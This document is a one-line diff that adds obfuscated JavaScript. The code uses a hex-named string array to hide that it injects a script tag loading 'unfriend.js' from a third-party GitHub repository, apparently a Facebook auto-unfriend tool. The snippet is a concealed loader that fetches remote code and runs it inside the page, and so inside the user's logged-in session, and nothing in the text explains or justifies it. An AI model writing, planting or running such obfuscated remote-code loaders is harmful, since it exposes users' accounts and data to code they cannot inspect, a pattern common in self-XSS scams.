@@ -1,0 +1,1 @@
+var _0x421e=["src","script","createElement","appendChild","body","https://github.com/bhargav1996/Fb-Auto-tools/raw/master/unfriend.js"];document[_0x421e[4]][_0x421e[3]](document[_0x421e[2]](_0x421e[1]))[_0x421e[0]]=_0x421e[5];
